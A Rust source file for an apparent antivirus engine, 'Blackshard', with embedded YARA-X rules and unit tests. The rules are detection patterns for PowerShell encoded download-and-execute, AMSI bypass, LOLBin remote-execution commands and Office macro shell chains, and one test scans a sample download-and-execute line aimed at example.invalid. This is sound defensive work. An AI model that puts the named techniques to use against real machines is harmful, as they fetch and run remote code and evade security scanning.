use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use std::time::Duration;
use yara_x::{Compiler, Rules, Scanner};

const BUILTIN_RULES: &str = r#"
rule Blackshard_EICAR_Test_File {
    strings:
        $eicar = { 58 35 4F 21 50 25 40 41 50 5B 34 5C 50 5A 58 35 34 28 50 5E 29 37 43 43 29 37 7D 24 45 49 43 41 52 2D 53 54 41 4E 44 41 52 44 2D 41 4E 54 49 56 49 52 55 53 2D 54 45 53 54 2D 46 49 4C 45 21 24 48 2B 48 2A }
    condition:
        filesize == 68 and $eicar at 0
}

rule Blackshard_Harmless_Self_Test {
    strings:
        $v2 = "BLACKSHARD-HARMLESS-SELF-TEST-V2" ascii
    condition:
        $v2 at 0
}

rule Blackshard_PowerShell_Obfuscated_Download_Execute {
    strings:
        $ps1 = "powershell" ascii wide nocase
        $ps2 = "pwsh" ascii wide nocase
        $encode1 = "-EncodedCommand" ascii wide nocase
        $encode2 = "FromBase64String" ascii wide nocase
        $download1 = "DownloadString" ascii wide nocase
        $download2 = "Invoke-WebRequest" ascii wide nocase
        $download3 = "System.Net.WebClient" ascii wide nocase
        $execute1 = "Invoke-Expression" ascii wide nocase
        $execute2 = "IEX(" ascii wide nocase
    condition:
        1 of ($ps*) and 1 of ($encode*) and 1 of ($download*) and 1 of ($execute*)
}

rule Blackshard_PowerShell_AMSI_Bypass_Sequence {
    strings:
        $amsi1 = "AmsiScanBuffer" ascii wide nocase
        $amsi2 = "amsiInitFailed" ascii wide nocase
        $amsi3 = "System.Management.Automation.AmsiUtils" ascii wide nocase
        $tamper1 = "VirtualProtect" ascii wide nocase
        $tamper2 = "GetProcAddress" ascii wide nocase
        $reflect = "GetField" ascii wide nocase
    condition:
        2 of ($amsi*) and 1 of ($tamper*) and $reflect
}

rule Blackshard_LOLBin_Remote_Execution_Command {
    strings:
        $certutil = /certutil(\.exe)?\s+[^\r\n]{0,100}(-urlcache|-decode)/ ascii nocase
        $bitsadmin = /bitsadmin(\.exe)?\s+[^\r\n]{0,100}\/transfer/ ascii nocase
        $mshta = /mshta(\.exe)?\s+(https?:|javascript:|vbscript:)/ ascii nocase
        $regsvr = /regsvr32(\.exe)?\s+[^\r\n]{0,160}\/i:https?:/ ascii nocase
    condition:
        any of them
}

rule Blackshard_Office_Macro_AutoExec_Shell_Chain {
    strings:
        $auto1 = "AutoOpen" ascii wide nocase
        $auto2 = "Document_Open" ascii wide nocase
        $auto3 = "Workbook_Open" ascii wide nocase
        $shell1 = "WScript.Shell" ascii wide nocase
        $shell2 = "ShellExecute" ascii wide nocase
        $shell3 = "CreateObject" ascii wide nocase
        $payload1 = "powershell" ascii wide nocase
        $payload2 = "mshta" ascii wide nocase
        $payload3 = "rundll32" ascii wide nocase
    condition:
        1 of ($auto*) and 1 of ($shell*) and 1 of ($payload*)
}
"#;

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum RuleDisposition {
    Informational,
    Suspicious,
    Malicious,
}

/// Origin of a rule match. Provenance is carried into the evidence resolver so
/// an authenticated publisher bundle cannot silently acquire enforcement
/// authority merely by labelling a rule "malicious".
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RuleProvenance {
    EmbeddedTrustedTest,
    EmbeddedHeuristic,
    PublisherAuthenticated,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RuleEnforcementAuthority {
    AlertOnly,
    ExecutionDeny,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RulePolicy {
    pub identifier: String,
    pub disposition: RuleDisposition,
    pub risk_score: u8,
    pub threat_name: String,
    pub description: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RuleBundle {
    pub namespace: String,
    pub source: String,
    pub policies: Vec<RulePolicy>,
}

#[derive(Debug, Clone)]
pub struct RuleMatch {
    pub identifier: String,
    pub namespace: String,
    pub disposition: RuleDisposition,
    pub risk_score: u8,
    pub threat_name: String,
    pub description: String,
    pub provenance: RuleProvenance,
    pub enforcement_authority: RuleEnforcementAuthority,
}

#[derive(Clone)]
pub struct RuleEngine {
    rules: Arc<Rules>,
    policies: Arc<HashMap<String, RulePolicy>>,
}

impl RuleEngine {
    pub fn builtin() -> Result<Self, String> {
        Self::compile(&[])
    }

    /// Compiles built-ins plus already authenticated rule bundles. Signature,
    /// expiry, and rollback verification belongs to the updater and must happen
    /// before this method is called.
    pub fn compile(authenticated_bundles: &[RuleBundle]) -> Result<Self, String> {
        let mut compiler = Compiler::new();
        compiler.new_namespace("blackshard_builtin");
        compiler
            .add_source(BUILTIN_RULES)
            .map_err(|error| format!("built-in rule compilation failed: {error}"))?;

        let mut policies = builtin_policies();
        for bundle in authenticated_bundles {
            validate_namespace(&bundle.namespace)?;
            compiler.new_namespace(&bundle.namespace);
            compiler
                .add_source(bundle.source.as_str())
                .map_err(|error| {
                    format!("rule bundle {} did not compile: {error}", bundle.namespace)
                })?;
            for policy in &bundle.policies {
                let mut policy = policy.clone();
                policy.risk_score = policy.risk_score.min(100);
                policies.insert(policy_key(&bundle.namespace, &policy.identifier), policy);
            }
        }

        Ok(Self {
            rules: Arc::new(compiler.build()),
            policies: Arc::new(policies),
        })
    }

    pub fn scan(&self, bytes: &[u8]) -> Result<Vec<RuleMatch>, String> {
        let mut scanner = Scanner::new(&self.rules);
        scanner
            .set_timeout(Duration::from_millis(250))
            .max_matches_per_pattern(32)
            .fast_scan(true);
        let results = scanner
            .scan(bytes)
            .map_err(|error| format!("YARA-X scan failed: {error}"))?;

        let mut matches = Vec::new();
        for matched in results.matching_rules() {
            let identifier = matched.identifier().to_owned();
            let namespace = matched.namespace().to_owned();
            let policy = self
                .policies
                .get(&policy_key(&namespace, &identifier))
                .cloned()
                .unwrap_or_else(|| RulePolicy {
                    identifier: identifier.clone(),
                    disposition: RuleDisposition::Suspicious,
                    risk_score: 25,
                    threat_name: format!("YARA.{identifier}"),
                    description:
                        "authenticated rule matched without an explicit enforcement policy"
                            .to_owned(),
                });
            let provenance = provenance_for(&namespace, &identifier);
            let enforcement_authority = enforcement_authority_for(&namespace, &identifier);
            matches.push(RuleMatch {
                identifier,
                namespace,
                disposition: policy.disposition,
                risk_score: policy.risk_score,
                threat_name: policy.threat_name,
                description: policy.description,
                provenance,
                enforcement_authority,
            });
        }
        Ok(matches)
    }
}

fn provenance_for(namespace: &str, identifier: &str) -> RuleProvenance {
    if namespace != "blackshard_builtin" {
        RuleProvenance::PublisherAuthenticated
    } else if matches!(
        identifier,
        "Blackshard_EICAR_Test_File" | "Blackshard_Harmless_Self_Test"
    ) {
        RuleProvenance::EmbeddedTrustedTest
    } else {
        RuleProvenance::EmbeddedHeuristic
    }
}

fn enforcement_authority_for(namespace: &str, identifier: &str) -> RuleEnforcementAuthority {
    if namespace == "blackshard_builtin"
        && matches!(
            identifier,
            "Blackshard_EICAR_Test_File" | "Blackshard_Harmless_Self_Test"
        )
    {
        RuleEnforcementAuthority::ExecutionDeny
    } else {
        RuleEnforcementAuthority::AlertOnly
    }
}

fn builtin_policies() -> HashMap<String, RulePolicy> {
    let entries = [
        (
            "Blackshard_EICAR_Test_File",
            RuleDisposition::Malicious,
            100,
            "EICAR-Test-File",
            "matched the industry-standard harmless antivirus test file",
        ),
        (
            "Blackshard_Harmless_Self_Test",
            RuleDisposition::Malicious,
            100,
            "Blackshard-Self-Test",
            "matched the internal Blackshard harmless protection test payload",
        ),
        (
            "Blackshard_PowerShell_Obfuscated_Download_Execute",
            RuleDisposition::Suspicious,
            45,
            "Suspicious.PowerShell.DownloadExecute",
            "combined obfuscation, download, and in-memory execution indicators",
        ),
        (
            "Blackshard_PowerShell_AMSI_Bypass_Sequence",
            RuleDisposition::Suspicious,
            55,
            "Suspicious.PowerShell.AMSIBypass",
            "multiple AMSI tampering indicators appeared in one payload",
        ),
        (
            "Blackshard_LOLBin_Remote_Execution_Command",
            RuleDisposition::Suspicious,
            40,
            "Suspicious.LOLBin.RemoteExecution",
            "a Windows utility was configured to retrieve or execute remote content",
        ),
        (
            "Blackshard_Office_Macro_AutoExec_Shell_Chain",
            RuleDisposition::Suspicious,
            45,
            "Suspicious.Office.AutoExecShell",
            "macro auto-execution and shell payload indicators were combined",
        ),
    ];

    entries
        .into_iter()
        .map(
            |(identifier, disposition, risk_score, threat_name, description)| {
                let policy = RulePolicy {
                    identifier: identifier.to_owned(),
                    disposition,
                    risk_score,
                    threat_name: threat_name.to_owned(),
                    description: description.to_owned(),
                };
                (policy_key("blackshard_builtin", identifier), policy)
            },
        )
        .collect()
}

fn policy_key(namespace: &str, identifier: &str) -> String {
    format!("{namespace}\0{identifier}")
}

fn validate_namespace(namespace: &str) -> Result<(), String> {
    if namespace.is_empty()
        || namespace.len() > 64
        || !namespace
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || byte == b'_' || byte == b'-')
    {
        return Err(format!("invalid rule namespace: {namespace:?}"));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    const EICAR: &[u8] = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

    #[test]
    fn exact_eicar_rule_is_high_confidence_malicious() {
        let engine = RuleEngine::builtin().unwrap();
        let matches = engine.scan(EICAR).unwrap();
        assert_eq!(matches.len(), 1);
        assert_eq!(matches[0].disposition, RuleDisposition::Malicious);
        assert_eq!(matches[0].risk_score, 100);
        assert_eq!(
            matches[0].enforcement_authority,
            RuleEnforcementAuthority::ExecutionDeny
        );
    }

    #[test]
    fn suspicious_script_rule_does_not_claim_malicious() {
        let engine = RuleEngine::builtin().unwrap();
        let matches = engine
            .scan(
                b"powershell -EncodedCommand AAA; $x=[Convert]::FromBase64String('AA=='); \
                  (New-Object System.Net.WebClient).DownloadString('https://example.invalid'); \
                  Invoke-Expression $x",
            )
            .unwrap();
        assert!(matches.iter().any(|item| {
            item.identifier == "Blackshard_PowerShell_Obfuscated_Download_Execute"
                && item.disposition == RuleDisposition::Suspicious
        }));
        assert!(!matches
            .iter()
            .any(|item| item.disposition == RuleDisposition::Malicious));
    }

    #[test]
    fn ordinary_text_has_no_matches() {
        let engine = RuleEngine::builtin().unwrap();
        assert!(engine
            .scan(b"This is an ordinary Blackshard project document.")
            .unwrap()
            .is_empty());
    }

    #[test]
    fn invalid_bundle_namespace_is_rejected() {
        let bundle = RuleBundle {
            namespace: "bad namespace".to_owned(),
            source: "rule okay { condition: false }".to_owned(),
            policies: Vec::new(),
        };
        assert!(RuleEngine::compile(&[bundle]).is_err());
    }

    #[test]
    fn authenticated_publisher_rule_is_alert_only_even_when_malicious() {
        let bundle = RuleBundle {
            namespace: "publisher".to_owned(),
            source: "rule external_malicious { condition: true }".to_owned(),
            policies: vec![RulePolicy {
                identifier: "external_malicious".to_owned(),
                disposition: RuleDisposition::Malicious,
                risk_score: 100,
                threat_name: "Publisher.Test".to_owned(),
                description: "test".to_owned(),
            }],
        };
        let matched = RuleEngine::compile(&[bundle]).unwrap().scan(b"x").unwrap();
        assert_eq!(
            matched[0].provenance,
            RuleProvenance::PublisherAuthenticated
        );
        assert_eq!(
            matched[0].enforcement_authority,
            RuleEnforcementAuthority::AlertOnly
        );
    }
}
